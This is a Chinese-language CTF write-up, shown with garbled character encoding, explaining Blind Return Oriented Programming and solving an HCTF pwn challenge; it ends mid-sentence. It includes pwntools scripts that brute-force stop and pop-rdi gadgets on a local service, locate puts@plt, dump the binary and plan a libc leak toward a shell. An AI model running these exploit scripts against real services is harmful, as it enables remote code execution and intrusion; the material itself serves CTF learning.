        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å‰ä¸¤å¤©åœ¨360å®‰å…¨å®¢çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œã€Šæ ¼å¼åŒ–å­—ç¬¦ä¸²blind pwnè¯¦ç»†æ•™ç¨‹ã€‹ï¼Œçœ‹äº†ä¸‹å†…å®¹ï¼Œå¤§æ¦‚å°±æ˜¯æ•™æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–ä¸²æ¼æ´dump ç¨‹åºï¼Œä½†æ˜¯åœ¨äºŒè¿›åˆ¶æ¼æ´ä¸­ï¼Œä»¥åŠCTF Pwné¢˜å‹ä¸­ï¼Œè¿˜æœ‰ä¸€ç§è€ƒç‚¹ï¼Ÿè¯´åˆ©ç”¨æ–¹å¼å§ï¼Œå«Bind ROPã€‚å¯¹äºè¿™äº›ç›¸å…³çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥åœ¨æµè§ˆå™¨æœç´¢åˆ°ï¼Œæ¯”å¦‚K0å¸ˆå‚…<a href="http://bobao.360.cn/learning/detail/3415.html">ã€ŠBROP Attackä¹‹Nginxè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æåŠåˆ©ç”¨ã€‹</a>ï¼Œä»¥åŠmctrainå‰è¾ˆåœ¨wooyunç¤¾åŒºå‘å¸ƒçš„ã€ŠBlind Return Oriented Programming (BROP) Attack - æ”»å‡»åŸç†ã€‹ã€‚å…¶å®éƒ½èƒ½å¾ˆè¯¦ç»†çœ‹åˆ°äº†è§£BROPçš„æ”»å‡»åŸç†ï¼Œä»¥åŠæ”»å‡»æ ·ä¾‹ã€‚<br>å½“ç„¶è¿™ä¸ªä¹Ÿæ˜¯ã€Š åŸºç¡€æ ˆæº¢å‡ºåŠå…¶åˆ©ç”¨æ–¹å¼çš„ã€‹ç³»åˆ—çš„ä¸€éƒ¨åˆ†ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯BROP"><a href="#ä»€ä¹ˆæ˜¯BROP" class="headerlink" title="ä»€ä¹ˆæ˜¯BROP"></a>ä»€ä¹ˆæ˜¯BROP</h1><p>é‚£ä¹ˆæˆ‘ä¹Ÿåªæ˜¯åœ¨è¿™é‡Œå°½é‡è®©å¤§å®¶å…ˆæ˜ç™½ï¼Œä»€ä¹ˆæ˜¯BORPï¼Œä»¥åŠBROPçš„æ”»å‡»åŸç†ï¼Œä»¥åŠåœ¨åé¢æ”¾ä¸€ä¸ªæœ€è¿‘CTFä¸­ï¼ŒåŠHCTF â€“å‡ºé¢˜äººè·‘è·¯äº†çš„PWNé¢˜çš„è¯¦ç»†åˆ†æã€‚</p><p>BROP åŸæ–‡ï¼š<a href="http://www.scs.stanford.edu/brop/">Blind Return Oriented Programming (BROP) Website</a></p><p>å…¶æ ¸å¿ƒè¦ä¹‰å°±æ˜¯ï¼Œé€šè¿‡ROPçš„æ–¹æ³•ï¼Œè¿œç¨‹æ”»å‡»ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ŒåŠ«æŒç¨‹åºæ§åˆ¶æµç¨‹ã€‚å…¶éš¾ç‚¹åœ¨äºï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ç¨‹åºçš„æºä»£ç ä»¥åŠäºŒè¿›åˆ¶ç¨‹åºã€‚<br>è¯¦ç»†çš„ä¸œè¥¿ï¼Œæˆ‘ä¹Ÿä¸æƒ³å†ç»§ç»­æ¬äº†ï¼Œmctrainåœ¨æ–‡ç« è®²å¾—å·²ç»éå¸¸ä¸é”™äº†ï¼Œæˆ‘åœ¨è¿™é‡Œæä¾›æˆ‘çš„dropåœ°å€ï¼Œä¸è¿‡å¤§å®¶å°‘ç”¨é˜¿ï¼Œè¿™ç©æ„å„¿åƒæµé‡ <a href="http://wooyun.bestwing.top:5000/static/drops/tips-3071.html">Blind Return Oriented Programming (BROP) Attack - æ”»å‡»åŸç†</a></p><h2 id="å¤§æ¦‚æ€»ç»“ä¸‹"><a href="#å¤§æ¦‚æ€»ç»“ä¸‹" class="headerlink" title="å¤§æ¦‚æ€»ç»“ä¸‹"></a>å¤§æ¦‚æ€»ç»“ä¸‹</h2><p>çœ‹äº† Dropsçš„æ–‡ç« ï¼Œæˆ‘ä»¬å¤§æ¦‚å¯æ€»ç»“ä¸€ä¸‹æ”»å‡»æµç¨‹</p><ul><li>å¦‚æœæœ‰Canary é˜²æŠ¤ï¼Œéœ€è¦é€šè¿‡brute-forceæš´åŠ›ç ´è§£æˆ–è€… ä½œè€…æå‡ºçš„æ–¹æ³•â€œstack readingâ€</li><li>å¯»æ‰¾stop gadgetæˆ–è€…å« hang gadgetï¼Œè¿™gadgaetä½¿å¾—ç¨‹åºè¿›å…¥äº†æ— é™å¾ªç¯ï¼Œå¹¶ä¸”hangï¼Œä½¿å¾—æ”»å‡»è€…ä¿æŒè¿æ¥çŠ¶æ€ã€‚ï¼ˆå¦‚blockingçš„ç³»ç»Ÿè°ƒç”¨ sleep)</li><li>å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ï¼Œå³potentially useful gadgetsã€‚è¿™é‡ŒæŒ‡usefulæŒ‡çš„æ˜¯å…·æœ‰æŸäº›åŠŸèƒ½ï¼Œå¹¶ä¸ä¼šé€ æˆcrashçš„gadget</li><li>è¿œç¨‹dumpå†…å­˜ï¼Œï¼ˆå½“ç„¶å¦‚æœæœ‰æ ¼å¼åŒ–ä¸²ï¼Œå¯ä»¥åˆ©ç”¨é‚£ä¹Ÿç®€ä¾¿ç‹ å¤šï¼Œå¯ä»¥å‚è€ƒå®‰å…¨å®¢æ–‡ç« ã€Šæ ¼å¼åŒ–å­—ç¬¦ä¸²blind pwnè¯¦ç»†æ•™ç¨‹ã€‹ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ä¸€ä¸ª<strong>write</strong>çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¼ å…¥ä¸€ä¸ªsocketæ–‡ä»¶æè¿°ç¬¦ã€‚<br><code>write(int sock,void *buf,int len)</code><br>è½¬åŒ–æˆ4æ¡æ±‡ç¼–æŒ‡ä»¤å°±æ˜¯<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop %rdi ret</span><br><span class="line">pop %rsi ret</span><br><span class="line">pop %rdx ret</span><br><span class="line">call write ret</span><br></pre></td></tr></table></figure>ä¾æ¬¡å¯¹åº”çš„æ˜¯ <code>%rdi</code>-&gt;sock <code>%rsi</code>-&gt;buf <code>%rdx</code>-&gt;len<br>åœ¨æ ˆä¸Šæ„é€ å¥½è¿™ä¸ªå››ä¸ªgadgetçš„å†…å­˜åœ°å€ï¼Œä¾æ¬¡æ‰§è¡Œé¡ºåºè°ƒç”¨å°±å¯ä»¥äº†ï¼ˆè¿™å½“ç„¶æ˜¯åœ¨æˆ‘ä»¬è§£å†³æ‰Canaryä¹‹åï¼‰<ul><li>åœ¨dump å†…å­˜çš„è¿‡ç¨‹ä¸­ï¼Œ<code>pop %rdx ret</code>è¿™æ ·çš„gadgetä¹Ÿè®¸ä¸å®¹æ˜“æ‰¾åˆ°ï¼Œæ‰€ä»¥ä½œè€…åˆæå‡ºå¦ä¸€ç§æ–¹æ³•ï¼Œåˆ©ç”¨ strcmpå‡½æ•°ï¼Œè¾¾åˆ°ç›¸åŒæ•ˆæœ</li><li>æ‰€ä»¥ä¹‹åçš„ä»»åŠ¡æ˜¯ï¼š<ul><li>å¯»æ‰¾BROP Gadgetï¼ˆæ³¨:ä»€ä¹ˆæ˜¯BROP Gadget å¯åœ¨Dropsä»”ç»†é˜…è¯»ï¼‰</li><li>æ‰¾åˆ°å¯¹ç”¨PLTé¡¹<h1 id="HCTF-ä¹‹-å‡ºé¢˜äººå¤±è¸ªäº†-brop"><a href="#HCTF-ä¹‹-å‡ºé¢˜äººå¤±è¸ªäº†-brop" class="headerlink" title="HCTF ä¹‹ å‡ºé¢˜äººå¤±è¸ªäº† (brop)"></a>HCTF ä¹‹ å‡ºé¢˜äººå¤±è¸ªäº† (brop)</h1>äº†è§£äº†ï¼Œæ”»å‡»æµç¨‹ï¼Œä»¥åŠæ”»å‡»æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•åšè¿™ä¸ªé¢˜ç›®äº†ã€‚æ­ç”µçš„å¸ˆå‚…å·²ç»ï¼ŒæŠŠæºç å…¬å¼€åœ¨githubä¸Šäº†ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå·±æ‹¿ä¸‹æ¥ç¼–è¯‘ä¸€ä¸‹ã€‚</li></ul></li></ul></li><li>*å·²çŸ¥ä¿¡æ¯**<br>æ¯”èµ›çš„æ—¶å€™ï¼Œé¢˜ç›®ç»™äº†ipå’Œç«¯å£ å…¶ä»–ä»»ä½•ä¿¡æ¯éƒ½æ²¡æœ‰ã€‚ä½†æ˜¯åé¢ç»™å‡ºäº†bofçš„bufferå¤§å°ä½œä¸ºæç¤ºã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>è€Œä¸”é¢˜ç›®æ²¡æœ‰å¼€Canaryé˜²æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸éœ€è¦çªç ´Canary</li></ul><p>ç»è¿‡æµ‹è¯•ï¼Œå½“è¾“å…¥çš„å­—ç¬¦è¶…è¿‡72å­—èŠ‚ï¼Œç¨‹åºå°±ä¸ä¼šå†æ‰“å° No password, No gameäº†ã€‚</p><h2 id="é¦–å…ˆå¯»æ‰¾-stop-gadget"><a href="#é¦–å…ˆå¯»æ‰¾-stop-gadget" class="headerlink" title="é¦–å…ˆå¯»æ‰¾ stop gadget"></a>é¦–å…ˆå¯»æ‰¾ stop gadget</h2><p>è¿™ä¸ªåœ°æ–¹ï¼Œ<strong>muhe</strong>å¸ˆå‚…äº¤äº†æˆ‘ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯åˆ©ç”¨<code>pwntools</code>çš„å¼‚å¸¸å¤„ç†æ¥æ£€æµ‹ã€‚å› ä¸ºæˆ‘ä»¬éœ€è¦return addressæŒ‡å‘ä¸€å—ä»£ç åŒºåŸŸï¼Œå½“ç¨‹åºçš„æ‰§è¡Œæµè·³åˆ°é‚£æ®µåŒºåŸŸä¹‹åï¼Œç¨‹åºå¹¶ä¸ä¼šcrashï¼Œè€Œæ˜¯è¿›å…¥äº†æ— é™å¾ªç¯ï¼Œè¿™æ—¶ç¨‹åºä»…ä»…æ˜¯hangåœ¨äº†é‚£é‡Œï¼Œæ”»å‡»è€…èƒ½å¤Ÿä¸€ç›´ä¿æŒè¿æ¥çŠ¶æ€ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬æŠŠè¿™ç§ç±»å‹çš„gadgetï¼Œæˆä¸ºstop gadgetï¼Œè¿™ç§gadgetå¯¹äºå¯»æ‰¾å…¶ä»–gadgetså–åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment">#f = open(&quot;gadgets.txt&quot;,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#f = open(&#x27;res.txt&#x27;,&#x27;a&#x27;)</span></span><br><span class="line">    f = open(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span>(io.recv()!=<span class="literal">None</span>):</span><br><span class="line">            log.info(<span class="string">&quot;alie! at 0x%x&quot;</span> %addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[*] Rand:&#123;0&#125;&quot;</span>.format(start)</span><br><span class="line">    find_stop_gadget(start)</span><br><span class="line">    <span class="keyword">if</span> start &gt;<span class="number">0x40300000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¯èƒ½ä¼šå¾—åˆ°å¤šä¸ªgadgetï¼Œæ‰¾ä¸ªå¥½ç”¨çš„å°±å¯ä»¥äº†ã€‚</p><h2 id="æ‰¾useful-gadget"><a href="#æ‰¾useful-gadget" class="headerlink" title="æ‰¾useful gadget"></a>æ‰¾useful gadget</h2><p>ç”±äºè¿™ä¸ªé¢˜ç›®å®è´¨æ˜¯è°ƒç”¨putså‡½æ•°ï¼Œä¸æ˜¯writeå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸éœ€è¦ä¸‰ä¸ªgadgetï¼Œåªéœ€è¦1ä¸ª <code>pop rdi;ret</code>å°±è¶³å¤Ÿäº†</p><hr><p>%rdiï¼Œ%rsiï¼Œ%rdxï¼Œ%rcxï¼Œ%r8ï¼Œ%r9 ç”¨ä½œå‡½æ•°å‚æ•°ï¼Œä¾æ¬¡å¯¹åº”ç¬¬1å‚æ•°ï¼Œç¬¬2å‚æ•°ã€‚ã€‚ã€‚</p><hr><p>é‚£ä¹ˆå¦‚ä½•å¾—åˆ°ä¸€ä¸ª <code>pop rdi;ret</code>å‘¢ï¼Ÿæˆ‘ä»¬è®¾æƒ³ï¼Œåœ¨64ä½çš„ELFä¸­ï¼Œé€šå¸¸å­˜åœ¨ä¸€ä¸ªpop r15;ret å¯¹åº”çš„å­—èŠ‚ç ä¸º41 5f c3ã€‚åä¸¤å­—èŠ‚ç 5f c3å¯¹åº”çš„æ±‡ç¼–ä¸ºpop rdi;retã€‚<br>å¦‚æœæœ‰å­˜åœ¨ä¸€ä¸ªåœ°å€ addrï¼Œæ»¡è¶³</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr<span class="number">-1</span>)+l64(<span class="number">0</span>)+l64(ret) </span><br><span class="line">Payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr)+l64(<span class="number">0</span>)+l64(ret) </span><br><span class="line">Payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr+<span class="number">1</span>) +l64(ret) </span><br></pre></td></tr></table></figure><p>retæ˜¯ä¸€ä¸ªè¿”å›å‡½æ•°ï¼Œä¸”æœ‰è¾“å‡ºä¿¡æ¯ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°addrï¼Œå³<code>pop rdi;ret</code></p><hr><p>åœ¨64ä½ELFä¸­ï¼Œé€šå¸¸å­˜åœ¨ä¸€ä¸ªpop r15ï¼›retï¼Œå¯¹åº”çš„å­—èŠ‚ç ä¸º41 5f c3ã€‚åä¸¤å­—èŠ‚ç 5f c3å¯¹åº”çš„æ±‡ç¼–ä¸ºpop rdi;retã€‚<br>å¦‚æœaddrå°±æ˜¯æŒ‡å‘çš„5fï¼Œé‚£ä¹ˆaddr-1å°±æ˜¯æŒ‡å‘41ï¼ŒPayload1 = â€˜aâ€™*72 + l64(addr-1)+l64(0)+l64(0x400711) ï¼Œ41å’Œ5fç»„æˆä¸€ä¸ªæŒ‡ä»¤ï¼Œpop r15å‡ºæ¥ï¼Œåé¢æ¥è¿”å›åœ°å€0x400711ï¼Œæ ˆå¹³è¡¡æ»¡è¶³è¦æ±‚ã€‚Payload2 = â€˜aâ€™*72 + l64(addr)+l64(0)+l64(0x400711) ï¼Œpop rdiå‡ºæ¥ï¼Œä¹Ÿèƒ½æ­£å¸¸è¿”å›ã€‚Payload3 = â€˜aâ€™*72 + l64(addr+1) +l64(0x400711) ï¼Œaddr+1æŒ‡å‘c3å³retï¼Œç›´æ¥è¿”å›åè¿”å›0x400711</p><hr><p>äºæ˜¯ï¼Œæˆ‘å…ˆå»å¯»æ‰¾è¿™ä¹ˆä¸€ä¸ªretï¼Œè¿”å›æœ‰è¾“å‡ºä¿¡æ¯ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr) + p64(stop_gadget)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span> (io.recv()!=<span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">print</span> io.recv()</span><br><span class="line">        <span class="comment"># if &quot;No password, no game&quot; in io.recv():</span></span><br><span class="line">            io.info(<span class="string">&quot;find gadgets at 0x%x&quot;</span> % addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;[*] the ret addr at 0x%x&quot;</span> % (addr)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    ret_addr(start)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count &gt;<span class="number">0x1000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ‰äº† retï¼Œäºæ˜¯æˆ‘å¯ä»¥å¼€å§‹å¯»æ‰¾ <code>pop rdi;ret</code>äº†ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_useful_gadget</span>(<span class="params">addr</span>):</span></span><br><span class="line"></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr<span class="number">-1</span>) + p64(<span class="number">0</span>)+p64(ret)+p64(stop_gadget)</span><br><span class="line">    payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr) + p64(<span class="number">0</span>)+p64(ret)+p64(stop_gadget)</span><br><span class="line">    payload3 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr+<span class="number">1</span>) +p64(ret)+p64(stop_gadget)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(payload1)</span><br><span class="line">        <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">            io.sendline(payload2)</span><br><span class="line">            <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">                io.sendline(payload3)</span><br><span class="line">                <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">                    io.info(<span class="string">&quot;find gdgets at 0x%x&quot;</span> % addr)</span><br><span class="line">                    log_in_file(addr)</span><br><span class="line">                    io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line"><span class="comment"># count = 0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    get_useful_gadget(start)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>pop rdi;ret </code>äº† ï¼Œgadget çš„éœ€æ±‚æˆ‘ä»¬è¾¾åˆ°äº†ã€‚</p><h2 id="dump-ç¨‹åº"><a href="#dump-ç¨‹åº" class="headerlink" title="dump ç¨‹åº"></a>dump ç¨‹åº</h2><p>ç…§ç†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åº”è¯¥å¯ä»¥å¼€å§‹dumpç¨‹åºäº†ï¼Œä½†æ˜¯ç´§æ¥ç€ä¸€ä¸ªé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“<code>put_plt</code>çš„åœ°å€ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œputså‡½æ•°èƒ½æ‰“å°å­—ç¬¦ä¸²ï¼Œäºæ˜¯æˆ‘ä»¬è®¾æƒ³æ„é€ ä¸€ä¸ªpayloadæ¥éªŒè¯å¾—åˆ°çš„æ˜¯ä¸æ˜¯<code>puts_plt</code>çš„åœ°å€ï¼Œä¾‹å¦‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰“å°å‰å››ä¸ª\å­—ç¬¦ä¸º \x7fELFï¼Œåˆ™addrä¸º<code>puts_plt</code>ã€‚<br> æˆ‘æ‰¾åˆ°çš„æ˜¯ <code>pop_rdi_ret = 0x4005d6</code></p><p>æœ‰äº† gadget å’Œput_pltï¼Œæˆ‘ä»¬å°±å¯ä»¥ç€æ‰‹dumpç¨‹åºäº†ã€‚<br>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªleakçš„å‡½æ•°ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(pop_rdi_ret) +p64(addr) + p64(puts_plt) +p64(stop_gadget)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥å¼€å§‹leakï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœå¯¹ä¸€ä¸ª\x00çš„åœ°å€è¿›è¡Œleakï¼Œè¿”å›æ˜¯æ²¡æœ‰ç»“æœçš„ï¼Œå› æ­¤å¦‚æœè¿”å›æ²¡æœ‰ç»“æœï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¿™ä¸ªåœ°å€çš„å€¼ä¸º\x00ï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®ä¸º\x00ç„¶åå°†åœ°å€åŠ 1è¿›è¡Œdumpã€‚<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåˆ¤æ–­ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    data = <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>åŸºæœ¬è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥dumpæ–‡ä»¶äº†ï¼Œå½“æ–‡ä»¶dumpä¸‹æ¥ä»¥åï¼Œæˆ‘ä»¬å°±èƒ½å¾ˆå®¹æ˜“çš„å¾—åˆ°ä¸€äº›gotä¿¡æ¯ï¼Œé‚£æ ·æˆ‘ä»¬å¯ä»¥æ›´å®¹æ˜“çš„å»èµ·shell</p><hr><p>åªè¦åˆ†åˆ«ä»0x400000å’Œ0x600000å¼€å§‹dumpå°±å¯ä»¥ã€‚</p><hr><h2 id="leak-è·å–libc"><a href="#leak-è·å–libc" class="headerlink" title="leak è·å–libc"></a>leak è·å–libc</h2><p>å½“æˆ‘ä»¬å·²ç»è·å–äº†gotè¡¨ä¿¡æ¯åï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥è¿›ä¸€æ­¥å»leakå‡½æ•°ï¼Œç”¨<a href="http://libcdb.com/search?symbolA=__libc_start_main&addressA=0xb74a43e0&symbolB=setsockopt&addressB=0xb757c7b0">search_Libc</a>æˆ–è€…è‡ªå·±æ”¶é›†çš„libc åº“æŸ¥æ‰¾ç›¸åº”çš„libcã€‚é‚£ä¹ˆæˆ‘å°±å¯ä»¥è¿›ä¸€æ­¥æŸ¥è¯¢åç§»ï¼Œå°±å¯ä»¥æ„é€ payload èµ·shelläº†ã€‚</p><p>leak payload ä¹Ÿæ˜¯ç›¸ä¼¼çš„ï¼Œå°±ä¸é‡å¤äº†ã€‚<br>å½“ç„¶ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨Pwntoolsçš„å·¥å…· Dynelf æ¥leakæŸ¥è¯¢systemåœ°å€ï¼Œç„¶åæ‰¾ä¸€ä¸ªåœ°å€å†™å…¥<code>/bin/sh\x00</code>ã€‚</p><h2 id="æœ€åä¸€æ­¥å°±å¯ä»¥èµ·shelläº†ã€‚"><a href="#æœ€åä¸€æ­¥å°±å¯ä»¥èµ·shelläº†ã€‚" class="headerlink" title="æœ€åä¸€æ­¥å°±å¯ä»¥èµ·shelläº†ã€‚"></a>æœ€åä¸€æ­¥å°±å¯ä»¥èµ·shelläº†ã€‚</h2><p>å‰©ä¸‹çš„å†…å®¹åŸºæœ¬å’Œæˆ‘ä»¬ä¸€èˆ¬çš„leak info 